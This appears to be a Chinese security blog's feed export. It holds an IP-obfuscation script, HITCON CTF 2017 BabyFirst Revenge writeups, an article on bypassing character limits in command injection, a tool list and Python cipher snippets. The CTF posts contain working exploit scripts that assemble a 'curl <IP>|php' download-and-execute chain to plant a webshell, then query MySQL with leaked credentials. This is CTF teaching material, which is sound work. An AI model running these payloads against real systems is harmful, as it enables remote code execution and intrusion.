oct(int(x, 16)).zfill(moreZero + len(oct(int(x, 16)))).strip('L')def hex2int(x): return str(int(x, 16))def hex2hex(x): moreZero = random.choice(range(10)) return '0x' + '0' * moreZero + xp = [hex2hex, hex2int, hex2oct]res = []# "a.b.c.d"# Each of the four numeric parts specifies a byte of the address;# the bytes are assigned in left-to-right order to produce the binary address.res.extend(['.'.join([i[0](hi[0]), i[1](hi[1]), i[2](hi[2]), i[3](hi[3])]) for i in it.product(p, p, p, p)])# "a.b.c"# Parts a and b specify the first two bytes of the binary address.# Part c is interpreted as a 16-bit value that defines the rightmost two bytes of the binary address.res.extend(['.'.join([i[0](hi[0]), i[1](hi[1]), i[2](hi[4])]) for i in it.product(p, p, p)])# "a.b"# Part a specifies the first byte of the binary address.# Part b is interpreted as a 24-bit value that defines the rightmost three bytes of the binary address.res.extend(['.'.join([i[0](hi[0]), i[1](hi[5])]) for i in it.product(p, p)])# "a"# The value a is interpreted as a 32-bit value that is stored directly into the binary address without any byte rearrangement.res.extend(['.'.join([i[0](hi[6])]) for i in it.product(p)])for i in xrange(len(res)): print "[%d]\t%s" % (i, res[i])# -------------------------------------------------------------------------------# testimport osexcept_ip = []def test_notation(ip_notation): global except_ip x = os.popen('ping -n 1 -w 0.5 ' + ip_notation).readlines() answer = x[0] if len(x) == 1 else x[1] if ip not in answer: except_ip.append(ip_notation) return answer.decode('gbk').strip()print "\nchecking. . .",for i in xrange(len(res)): # print "[%d] %s\t\t\t%s" % (i, res[i], test_notation(res[i])) test_notation(res[i]) print '.',print "\n\ntotally %d notations of ip checked ,all are equivalent to %s" % (len(res), ip)if len(except_ip): print "except for notations following:\n", except_ip 结果列表123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125[0] 0x000c0.0xa8.0x0000042.0x0e9[1] 0x0000c0.0x0000000a8.0x000042.233[2] 0x000000000c0.0x000000000a8.0x000000042.0000000000351[3] 0x000c0.0x000000a8.66.0x000000e9[4] 0xc0.0xa8.66.233[5] 0x000000c0.0x000000000a8.66.0351[6] 0x000000000c0.0x00000000a8.0000102.0x0000000e9[7] 0x0000c0.0x000a8.00102.233[8] 0x00000000c0.0x00000a8.00000000102.0000000351[9] 0x00c0.168.0x0042.0x00000e9[10] 0x000000c0.168.0x00000000042.233[11] 0x0000000c0.168.0x0042.0000000351[12] 0x00000000c0.168.66.0x000000000e9[13] 0x000000c0.168.66.233[14] 0xc0.168.66.00351[15] 0xc0.168.0000102.0x00000e9[16] 0x00c0.168.000000000102.233[17] 0x0000c0.168.00102.00000000351[18] 0x0000000c0.0000250.0x00042.0xe9[19] 0x000c0.0000000250.0x000000042.233[20] 0x0c0.0000000250.0x00042.00000000351[21] 0xc0.0000000250.66.0xe9[22] 0x0000000c0.00000250.66.233[23] 0x000c0.00250.66.000000351[24] 0x00000c0.00000250.0000102.0xe9[25] 0x00000c0.000250.00102.233[26] 0x000c0.00000250.0000000000102.00000351[27] 192.0x000000000a8.0x0042.0x0e9[28] 192.0x0000000a8.0x0042.233[29] 192.0x0000000a8.0x0000042.0000351[30] 192.0x000000a8.66.0xe9[31] 192.0x00000000a8.66.233[32] 192.0x0000000a8.66.000351[33] 192.0xa8.00102.0x0000e9[34] 192.0x00a8.00102.233[35] 192.0x00000a8.000102.0000000000351[36] 192.168.0x42.0xe9[37] 192.168.0x000042.233[38] 192.168.0x0000000042.000000351[39] 192.168.66.0x000000000e9[40] 192.168.66.233[41] 192.168.66.0000351[42] 192.168.000102.0x00e9[43] 192.168.00000102.233[44] 192.168.00000000102.00000351[45] 192.0000000250.0x0000000042.0x000e9[46] 192.000250.0x00000000042.233[47] 192.0250.0x000000042.0351[48] 192.000250.66.0x000000e9[49] 192.0000250.66.233[50] 192.0000000000250.66.000351[51] 192.000000000250.00000102.0xe9[52] 192.00250.0000000102.233[53] 192.0250.00000000102.0351[54] 0000000300.0x000a8.0x0000000042.0x0000e9[55] 000000000300.0x000000000a8.0x0000000042.233[56] 0000000300.0x000000a8.0x00000042.000351[57] 0000000300.0x0000a8.66.0x000000000e9[58] 0000000000300.0x00000000a8.66.233[59] 0000000300.0x0a8.66.0000351[60] 0000300.0x00a8.0102.0x00e9[61] 0000300.0x0000000a8.000102.233[62] 000000300.0x000000000a8.00102.00000000351[63] 0000300.168.0x000042.0xe9[64] 0300.168.0x042.233[65] 0000000300.168.0x0000000042.0000351[66] 0000000300.168.66.0x000000000e9[67] 000300.168.66.233[68] 0000300.168.66.00000351[69] 000000000300.168.00102.0x00e9[70] 0300.168.000000000102.233[71] 0000300.168.000000102.00000351[72] 0000000000300.00000000250.0x0042.0x00000000e9[73] 00300.000000000250.0x42.233[74] 00000300.000250.0x00000000042.0000351[75] 000300.000000250.66.0x000000000e9[76] 0000000000300.000000250.66.233[77] 000000300.0250.66.00000351[78] 0000000300.000250.000000102.0xe9[79] 000300.00000000250.000102.233[80] 000000000300.0000000250.000102.0000000000351[81] 0x000000c0.0x00a8.0x42e9[82] 0x0000c0.0x000a8.17129[83] 0x000000c0.0x0000a8.00041351[84] 0x000000000c0.168.0x000042e9[85] 0x0000c0.168.17129[86] 0x0000c0.168.000041351[87] 0x0000000c0.00000000250.0x000000042e9[88] 0x00000c0.000000000250.17129[89] 0x000c0.00250.00041351[90] 192.0x0a8.0x0000000042e9[91] 192.0x000a8.17129[92] 192.0x000000a8.0041351[93] 192.168.0x000042e9[94] 192.168.17129[95] 192.168.00041351[96] 192.00250.0x000000042e9[97] 192.0250.17129[98] 192.000000000250.000041351[99] 00000300.0x00000a8.0x000000042e9[100] 000000000300.0x00000a8.17129[101] 00000300.0x000a8.00000000041351[102] 0300.168.0x000000042e9[103] 0300.168.17129[104] 00000000300.168.00000000041351[105] 0300.000000000250.0x0042e9[106] 000000000300.0000250.17129[107] 000000000300.00250.00000000041351[108] 0x0c0.0x00000a842e9[109] 0x00c0.11027177[110] 0x000000c0.0052041351[111] 192.0x0000a842e9[112] 192.11027177[113] 192.000000000052041351[114] 00000300.0x0000000a842e9[115] 0000000300.11027177[116] 0000000300.000000000052041351[117] 0x0000000c0a842e9[118] 3232252649[119] 000000030052041351checking. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . totally 120 notations of ip checked ,all are equivalent to 192.168.66.233[Finished in 3.1s]]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HITCON CTF 2017 BabyFirst Revenge & v2 writeup]]></title>
    <url>%2F171112HITCONCTFBabyfirstRevengeSeriesWP%2F</url>
    <content type="text"><![CDATA[from HITCON CTF 20172017/11/04 02:00 UTC ~ 2017/11/06 02:00 UTC https://ctf2017.hitcon.org/ BabyFirst Revenge Do you remember BabyFirst from HITCON CTF 2015? This is the harder version! http://52.199.204.34/ 源码12345678910&lt;?php $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) &#123; @exec($_GET['cmd']); &#125; else if (isset($_GET['reset'])) &#123; @exec('/bin/rm -rf ' . $sandbox); &#125; highlight_file(__FILE__); 解法详细说明：https://findneo.github.io/2017/11/171110Bypass4CLimit/ 拿到shell后在/home/fl4444g/README.txt 得到数据库配置信息，然后连接数据库得到flag。 12345678910111213141516http://52.199.204.34/sandbox/___MD5___of___ip/shell.php?cmd=cat%20/home/fl4444g/README.txt# Flag is in the MySQL database#fl4444g / SugZXUtgeJ52_Bvrhttp://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e "show databases;"# Database#information_schema#fl4gdbhttp://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e "select concat(table_name) from information_schema.tables where table_schema='fl4gdb';"# concat(table_name)#this_is_the_fl4ghttp://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e "use fl4gdb;select * from this_is_the_fl4g"# secret#hitcon&#123;idea_from_phith0n,thank_you:)&#125; EXP123456789101112131415161718192021222324252627282930313233343536373839404142# by https://findneo.github.io/import requests as rimport hashliburl = 'http://52.199.204.34/'# 查询自己的IPip = r.get('http://ipv4.icanhazip.com/').text.strip()sandbox = url + 'sandbox/' + hashlib.md5('orange' + ip).hexdigest() + '/'reset = url + '?reset'cmd = url + '?cmd='build = ['&gt;cur\\', '&gt;l\ \\', 'ls&gt;A', 'rm c*', 'rm l*', '&gt;105\\', '&gt;304\\', '&gt;301\\', '&gt;9\&gt;\\', 'ls&gt;&gt;A', 'sh A', 'php A' ]# 如果目标服务器有GET，这个也是可以打的# build = ['&gt;GE\\',# '&gt;T\\ \\',# 'ls&gt;A',# 'rm G*',# 'rm T*',# '&gt;105\\',# '&gt;304\\',# '&gt;301\\',# '&gt;9\&gt;\\',# 'ls&gt;&gt;A']r.get(reset)for i in build: s = r.get(cmd + i) print '[%s]' % s.status_code, s.urls = r.get(sandbox + 'fun.php?cmd=uname -a')print '\n' + '[%s]' % s.status_code, s.urlprint s.text 更多解答https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge BabyFirst Revenge v2 BabyFirst Revenge v2This is the hardest version! Short enough? http://52.197.41.31/ 源码12345678910&lt;?php $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 4) &#123; @exec($_GET['cmd']); &#125; else if (isset($_GET['reset'])) &#123; @exec('/bin/rm -rf ' . $sandbox); &#125; highlight_file(__FILE__); 解法这题是赛后看wp复现的，只到拿webshell的部分。 详细说明： https://findneo.github.io/2017/11/171110Bypass4CLimit/ EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#-*-coding:utf8-*-# by https://findneo.github.io/import requests as rfrom time import sleepimport randomimport hashlibtarget = 'http://52.197.41.31/'# 存放待下载文件的公网主机的IPshell_ip = 'xx.xx.xx.xx'# 本机IPyour_ip = r.get('http://ipv4.icanhazip.com/').text.strip()# 将shell_IP转换成十六进制ip = '0x' + ''.join([str(hex(int(i))[2:].zfill(2)) for i in shell_ip.split('.')])reset = target + '?reset'cmd = target + '?cmd='sandbox = target + 'sandbox/' + \ hashlib.md5('orange' + your_ip).hexdigest() + '/'# payload某些位置的可选字符pos0 = random.choice('efgh')pos1 = random.choice('hkpq')pos2 = 'g' # 随意选择字符payload = [ '&gt;dir', # 创建名为 dir 的文件 '&gt;%s\&gt;' % pos0, # 假设pos0选择 f , 创建名为 f&gt; 的文件 '&gt;%st-' % pos1, # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1， # 因为alphabetical序中t&gt;s '&gt;sl', # 创建名为 &gt;sl 的文件；到此处有四个文件， # ls 的结果会是：dir f&gt; kt- sl '*&gt;v', # * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ， # dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符 '&gt;rev', # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v '*v&gt;%s' % pos2, # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。体会一下。 # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f # 续行分割 curl 0x11223344|php 并逆序写入 '&gt;p', '&gt;ph\\', '&gt;\|\\', '&gt;%s\\' % ip[8:10], '&gt;%s\\' % ip[6:8], '&gt;%s\\' % ip[4:6], '&gt;%s\\' % ip[2:4], '&gt;%s\\' % ip[0:2], '&gt;\ \\', '&gt;rl\\', '&gt;cu\\', 'sh ' + pos2, # sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来， # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行 'sh ' + pos0, # sh f 执行curl命令，下载文件，写入木马。]s = r.get(reset)for i in payload: assert len(i) &lt;= 4 s = r.get(cmd + i) print '[%d]' % s.status_code, s.url sleep(0.1)s = r.get(sandbox + 'fun.php?cmd=uname -a')print '[%d]' % s.status_code, s.urlprint s.text 更多解答https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2 参考链接来自小密圈里的那些奇技淫巧]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何绕过四个字符限制getshell]]></title>
    <url>%2F171110Bypass4CLimit%2F</url>
    <content type="text"><![CDATA[本文首发于安全客 (https://www.anquanke.com/post/id/87203) 前言本文主要整理如何巧用Linux命令绕过命令注入点的字符数量限制，内容围绕HITCON CTF 2017 的两道题展开，先讲五个字符的限制，再讲四个字符的。在此感谢下主办方分享这么有趣的点子。 热身问题的起源是 HITCON CTF 2017 的 BabyFirst Revenge 题，题目的主要代码如下： 1234567891011BabyFirst Revenge&lt;?php $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) &#123; @exec($_GET['cmd']); &#125; else if (isset($_GET['reset'])) &#123; @exec('/bin/rm -rf ' . $sandbox); &#125; highlight_file(__FILE__); 冷静分析目标环境根据每个访问者的IP为其在sandbox里新建一个文件夹并作为其工作目录，接受并执行访问者提交的命令。访问者可随时通过提交reset来重置环境。这是个有限制无回显的后门，命令长度要求小于等于5 ，我们会希望利用这一点撕开口子，往服务器上写一个自己的木马，从而扩大命令执行范围。 我们所面临的最主要问题是能够执行的命令长度太短，因此考虑把命令写进文件里再执行，命令的功能是下载我们指定的文件。 在此之前，先做些知识铺垫。 IP的等价表示法IP地址本质上就是一个整数，只是通常用点分十进制表示，以至于我们反而不太熟悉它本来的样子。只要必要，我们可以用十六进制、长整数、八进制表示IP，大部分情况下效果是相同的。 它们之间的转换也很方便： 12345678910ip = '127.0.0.1'# 十六进制print '0x' + ''.join([str(hex(int(i))[2:].zfill(2)) for i in ip.split('.')])# 长整数print int(''.join([str(hex(int(i))[2:].zfill(2)) for i in ip.split('.')]), 16)# 八进制print '0' + oct(int(''.join([str(hex(int(i))[2:].zfill(2)) for i in ip.split('.')]), 16)) 从网络下载文件 利用续行符拆分命令成多行 用两个字符在Linux下创建文件 将命令执行结果重定向到文件 利用重定向向文件追加内容 删除文件 ls 的文件排列顺序一句alphabetical耐人寻味，不过大致顺序就是如下图所示。 开始表演假设我有一台目标服务器能够访问到的公网主机，为了方便我把该主机IP转换成长整数，然后利用以上的知识将 curl ip &gt; A 用续行方式切割成多行写进文件 A ，然后执行 sh A 就可以下载到预先放在公网主机上的文件并且覆盖本地的文件A，而下载下来的文件内容是用来写PHP木马的PHP代码，我再执行 php A就可以写个自己的webshell进去啦。 这里比较取巧的是我的公网IP转成长整形恰好能分割成顺序的四段，如果构造不出来，可以试试十六进制，八进制，找台能用的主机等等：）或者继续往下看，还会有其他办法。 另外，其实GET也是能用的，只是目标主机里没有安装所以这题不能用。 接下来让我们完成最后30%的工作，写个exp。 123456789101112131415161718192021222324252627282930313233343536373839404142# -*- coding:utf8 -*-import requests as rimport hashliburl = 'http://52.199.204.34/'# 查询自己的IPip = r.get('http://ipv4.icanhazip.com/').text.strip()sandbox = url + 'sandbox/' + hashlib.md5('orange' + ip).hexdigest() + '/' reset = url + '?reset'cmd = url + '?cmd='build = ['&gt;cur\', '&gt;l \', 'ls&gt;A', 'rm c*', 'rm l*', '&gt;105\', '&gt;304\', '&gt;301\', '&gt;9&gt;\', 'ls&gt;&gt;A', 'sh A', 'php A' ]# 如果目标服务器有GET，这个也是可以打的# build = ['&gt;GE\',# '&gt;T\ \',# 'ls&gt;A',# 'rm G*',# 'rm T*',# '&gt;105\',# '&gt;304\',# '&gt;301\',# '&gt;9&gt;\',# 'ls&gt;&gt;A']r.get(reset)for i in build: s = r.get(cmd + i) print '[%s]' % s.status_code, s.url s = r.get(sandbox + 'fun.php?cmd=uname -a')print 'n' + '[%s]' % s.status_code, s.urlprint s.text 运行效果 挑战升级这篇文章有趣的地方才刚刚开始。 代码只改了一个字符，但趣味已经不在一个量级。一脸懵逼的我看了大佬们的wp后兴奋不已。 BabyFirst Revenge v2： 1234567891011&lt;?php $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']) @mkdir($sandbox) @chdir($sandbox) if (isset($_GET['cmd']) &amp; &amp; strlen($_GET['cmd']) &lt;= 4) &#123; @exec($_GET['cmd']) &#125; else if (isset($_GET['reset'])) &#123; @exec('/bin/rm -rf ' . $sandbox) &#125; highlight_file(__FILE__) 热烈分析只有四个字符的施展空间意味着我们能做的事情少之又少，但Linux本身的简洁给了我们机会。 突破之旅从神奇的星号 * 开始。 经过简单测试我们猜测 * 的作用相当于 ls 。这其实相当厉害，我们本就基本上可以创建任意名字的短文件，现在又可以一个字符就把这些文件名连起来当作命令执行，这提供了很大的想象空间。 还有本质上一样但现象很有趣的，待会儿会用到： 虽然这些特技提供了一些可能性，但是 ls 列出的文件顺序问题仍然是个挑战，我们很难在 alphabetical 序的基础上构造出有用的命令。 写入时间是我们可以控制的，如果能执行 ls –t（将文件按时间排序输出），那么只要把想执行的命令分割成若干段然后逆序写入，就可以随心所欲地构造出任意命令。考虑到 ls -t 本身就已经有4个字符了，我们故技重施，先将 ls -t &gt; f 写入文件 g 中，然后执行 sh g 即可将我们分段逆序写入的命令拼接起来。 在开始操作前，再介绍两个会用到的命令：dir 和 rev。 dir在GNU文档中有下图这样的描述： 虽然基本上和 ls 一样，但有两个好处，一是开头字母是d ，这使得它在 alphabetical 序中靠前，二是按列输出，不换行。 rev这个前面出场过，可以反转文件每一行的内容。 实验一下： 开始挑战需要知道的命令和 tips 都已经介绍了，下面是代码和解释： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#-*-coding:utf8-*-import requests as rfrom time import sleepimport randomimport hashlibtarget = 'http://52.197.41.31/' # 存放待下载文件的公网主机的IPshell_ip = 'xx.xx.xx.xx' # 本机IPyour_ip = r.get('http://ipv4.icanhazip.com/').text.strip() # 将shell_IP转换成十六进制ip = '0x' + ''.join([str(hex(int(i))[2:].zfill(2)) for i in shell_ip.split('.')]) reset = target + '?reset'cmd = target + '?cmd='sandbox = target + 'sandbox/' + hashlib.md5('orange' + your_ip).hexdigest() + '/' # payload某些位置的可选字符pos0 = random.choice('efgh')pos1 = random.choice('hkpq')pos2 = 'g' # 随意选择字符 payload = [ '&gt;dir', # 创建名为 dir 的文件 '&gt;%s&gt;' % pos0, # 假设pos0选择 f , 创建名为 f&gt; 的文件 '&gt;%st-' % pos1, # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1， # 因为alphabetical序中t&gt;s '&gt;sl', # 创建名为 &gt;sl 的文件；到此处有四个文件， # ls 的结果会是：dir f&gt; kt- sl '*&gt;v', # 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ， # 前面提到dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符 '&gt;rev', # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v '*v&gt;%s' % pos2, # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。 # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f # 续行分割 curl 0x11223344|php 并逆序写入 '&gt;p', '&gt;ph\', '&gt;|\', '&gt;%s\' % ip[8:10], '&gt;%s\' % ip[6:8], '&gt;%s\' % ip[4:6], '&gt;%s\' % ip[2:4], '&gt;%s\' % ip[0:2], '&gt; \', '&gt;rl\', '&gt;cu\', 'sh ' + pos2, # sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来， # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行 'sh ' + pos0, # sh f 执行curl命令，下载文件，写入木马。] s = r.get(reset)for i in payload: assert len(i) &lt;= 4 s = r.get(cmd + i) print '[%d]' % s.status_code, s.url sleep(0.1)s = r.get(sandbox + 'fun.php?cmd=uname -a')print '[%d]' % s.status_code, s.urlprint s.text 运行效果 后记我相信除了文中给出的方法外一定还有一些奇招，大家可以多多探索，可以围观HITCON CTF 2107的官方解答区，还可以学习下Phithon师傅的《小密圈里的那些奇技淫巧》 中与本文主题相关的部分。 最后，如果关于文章内容有任何建议或疑惑，你可以在https://findneo.github.io/ 联系本文作者。感谢阅读o/ 本文由安全客原创发布如若转载，请注明出处： https://www.anquanke.com/post/id/87203 安全客 - 有思想的安全新媒体]]></content>
      <categories>
        <category>社区投稿</category>
      </categories>
      <tags>
        <tag>命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利器]]></title>
    <url>%2F171103ComputerTools%2F</url>
    <content type="text"><![CDATA[https://github.com/findneo/computerTools 系统优化类everything 本地文件全盘搜索。 agentransack 本地文档全文搜索。 filelocator 付费版本地文档全文搜索。 notepad++ 轻量却强大的文本编辑器，支持插件扩展和很多自定义项。 ​ 插件推荐： markdownviewer++ 预览md文件 php autocompletion emmet Resilio Sync 就像，不限容，不限速，无审查的云盘 。 teleport ultra 全站克隆到本地 。 iobitUninstaller 程序彻底卸载。 迅雷极速版7.10.34.360 存粹的下载器。 shadowsocks 代理工具，更方便地访问互联网。 splayer 本地视音频播放器，无广告，可自动搜索影片字幕。已停更。 potplayer 强大的影音播放器。 f.lux 自动调节电脑屏幕色温，保护视力。win10创意者更新中已集成到系统 。 护眼啦 定时提醒休息。高于1.6的某些版本会报毒。可自行谷歌 或 百度 下载低版本。 eyerest ubuntu下的护眼工具。 foxmail邮箱客户端，RSS功能也不错。 加加输入法 文明和谐的输入法。 7zip 开源免费无广告的压缩工具。 win10锁屏壁纸所在文件夹(C:\Users\\++username++\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets) 谷歌浏览器 中文版,英文版 插件推荐： octotree github目录树查看。 adblock 拦截广告 印象笔记 cookiesmanager shodan listen1集成多平台歌源，下载压缩包并解压后以chrome开发者模式加载 tamperMonkey 有道取词1.4 更多脚本 火狐浏览器 插件推荐： 印象笔记 GreasyMonkey 有道取词1.4 更多脚本 Hack Bar firebug uBlock Origin Bookmark Dedulplicator add to wunderlist Tamper Data拦截修改 Modify Headers修改头部 AutoProxy NoScript Live Http Header markdown相关: 马克飞象 markdownPad2 右侧即时预览的markdown编辑器 typora 所见即所得的markdown编辑器 文件同步： allwaysync 坚果云 dopdf 其他格式文件转pdf，效果不错。 telegram 即时通讯工具，被墙。 WPS Office 2013 个人版 学习相关类印象笔记 sumatraPdf 小巧好用的PDF阅读器，已停更。 福昕(xin)pdf阅读器 freemind 开源的思维导图工具。 goldenDict 离线词典。 todotxt，纯文本GTD工具。 calibre 书籍管理，azw阅读器很棒 。 myBase 知识管理。 zeal 离线文档查询。 Cisco Packet Tracer Student，路由模拟器。 GNS3 数据通信模拟器。 开发相关类visual studio code sublimeText 功能齐全，好看。 插件HTML-CSS-JS Prettify jedi ：python自动补全 anaconda Localization汉化 ConvertToUTF8解决编码问题 Bracket Highlighter匹配括号，引号和html标签。 DocBlockr 自动生成PHPDoc风格的注释。支持的js, PHP, ActionScript, CoffeeScript, Java, Objective C, C, C++ Emmet(Zen Coding) 快速生成HTML代码段的插件,很强大。比如试试html:4s 其它相关 https://github.com/jikeytang/sublime-text devcpp wing IDE python 集成开发环境 git 版本管理 远程管理 MobaXterm 强大，方便，好看。 winscp real VNC xshell secureCRT putty teamviewer weevely 中国菜刀 本地环境搭建 wamp phpstudy source insight matlab jre/jdk python/anaconda wsl linux fish shell zsh shell 安全类winhex 010editor zip压缩文件爆破 advanced zip password recovery ziperello 御剑 awvs nmap sqlmap burpsuite wireshark fiddler OD IDAPRO OWASP Mantra Janus MoC en 0.3 Alpha seay代码审计系统 virtual box开源的虚拟机软件，内存占用较小 vmware kali backtrack 52pojie虚拟机 xampp+dvwa Metasploitable-linux OWASP_Broken_Web_Apps_VM SEEDUbuntu web for pentester WebGoat-OWASP_standard_win32 小工具 微软的签名检查命令行工具sigcheck 微软的命令行校验工具fciv HXD十六进制编辑器 截图工具snipaste 硬件信息检测CPU-Z 好的在线工具 markdown协作 文本共享]]></content>
      <categories>
        <category>备忘</category>
      </categories>
      <tags>
        <tag>hacklife</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用python实现几种常见简单加密]]></title>
    <url>%2F171015PythonSnippets%2F</url>
    <content type="text"><![CDATA[栅栏密码加解密单行版本12railFence = lambda s: [[i, ''.join([s[k * i + j] for j in range(i) for k in range(len(s) / i)])] for i in range(1, len(s)) if not len(s) % i]print railFence('hello world , 2017 ! ') 正常版本123456789101112131415def railFence(s): ll = len(s) res = dict() for i in range(1, ll): r = '' if ll % i == 0: for j in range(i): for k in range(ll / i): r += s[k * i + j] res[i] = r return res# testprint railFence('hello world , 2017 ! ')# &#123;1: 'hello world , 2017 ! ', 3: 'hlwl,0 eood 1!l r 27 ', 7: 'ho2er0ll1ld7o ,!w '&#125; 凯撒密码加解密单行版本12def caesar(s): return [[off, ''.join([chr((ord(i) - 97 + off) % 26 + 97) if 'a' &lt;= i &lt;= 'z' else chr((ord(i) - 65 + off) % 26 + 65) if 'A' &lt;= i &lt;= 'Z' else i for i in str(s)])] for off in range(26)]print caesar('h3llo') 正常版本123456789101112131415161718192021def caesar(s): cycle = 26 res = [] for offset in range(26): r = '' for i in str(s): if 'a' &lt;= i &lt;= 'z': r += chr((ord(i) - ord('a') + offset) % cycle + ord('a')) elif 'A' &lt;= i &lt;= 'Z': r += chr((ord(i) - ord('A') + offset) % cycle + ord('A')) else: r += i res.append([offset, r]) return res# testprint caesar('h3llo')#[ [0, 'h3llo'], [1, 'i3mmp'], [2, 'j3nnq'], [3, 'k3oor'], [4, 'l3pps'], [5, 'm3qqt'], [6, 'n3rru'], [7, 'o3ssv'],# [8, 'p3ttw'], [9, 'q3uux'], [10, 'r3vvy'], [11, 's3wwz'], [12, 't3xxa'], [13, 'u3yyb'], [14, 'v3zzc'],# [15, 'w3aad'], [16, 'x3bbe'], [17, 'y3ccf'], [18, 'z3ddg'], [19, 'a3eeh'], [20, 'b3ffi'], [21, 'c3ggj'],# [22, 'd3hhk'], [23, 'e3iil'], [24, 'f3jjm'], [25, 'g3kkn']] 莫尔斯电码加解密123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# by https://findneo.github.io/import redef morse(s): morseChart = ['.-', '-...', '-.-.', '-..', '.', '..-.', '--.', '....', '..', '.---', '-.-', '.-..', '--', '-.', '---', '.--.', '--.-', '.-.', '...', '-', '..-', '...-', '.--', '-..-', '-.--', '--..', '-----', '.----', '..---', '...--', '....-', '.....', '-....', '--...', '---..', '----.', '.-.-.-', '--..--', '..--..', '-....-', '.----.', '---...', '.-..-.', '-..-.', '.--.-.', '-.-.-.', '-...-', '-.-.--', '..--.-', '-.--.', '-.--.-', '...-..-', '.-...', '.-.-.', ' ', '*' ] alphaChart = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '.', ',', '?', '-', "'", ':', '"', '/', '@', ';', '=', '!', '_', '(', ')', '$', '&amp;', '+', ' ', '#' ] # or as a dict -&gt; &#123;c[1][i]: c[0][i] for i in xrange(len(c[0]))&#125; c = [morseChart, alphaChart] s = s.lower() # replace characters not in alphaChart with '#' ,which shall be '*' in # encoded string s = re.sub('[^a-z0-9.,?\-\':"/@;=!_()$&amp;+ ]', '#', s) # for convenience sake, I choose not to deal with space in morse. s = re.sub('\s+', ' ', s) m = 1 # default to decode # if mot mismatch that condition,we are to encode. if not re.match('[^-._ ]', s): # occasionally we meet [ ._]+ instead of [ .-]+ s = s.replace('_', '-') s = re.split(' ', s) m = 0 # we are to encode by morse r = [] # list().extend(foo) returns None so we use 'or r' return (m * ' ').join(r.extend([c[1 - m][c[m].index(i)] for i in s]) or r)# testprint morse('Hello word,2017!')print morse('.... . .-.. .-.. --- .-- --- .-. -.. --..-- ..--- ----- .---- --... -.-.--') base64混合编码1234567891011from base64 import *import randomdef baseRandomEncode(s, depth=3): for i in xrange(depth): s = random.choice([b64encode, b32encode, b16encode])(s) return sprint baseRandomEncode('hello world!') # test base64混合解码123456789101112131415161718192021222324252627# by https://findneo.github.io/from base64 import *import reres = []# repattern is a self-defining item.# In CTF games,flag often comes as a printable string containing '&#123;' and '&#125;'.repattern = "[ -~]*&#123;[ -~]*&#125;[ -~]*|[ -~]*&#125;[ -~]*&#123;[ -~]*"def basefuzzDecode(s): global res for f in [b64decode, b32decode, b16decode]: try: t = f(s) if re.match(repattern, t): res.append(t) return 0 else: basefuzzDecode(t) except: pass return resprint basefuzzDecode(baseRandomEncode('flag&#123;hello ctf!&#125;')) # test]]></content>
      <categories>
        <category>code</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
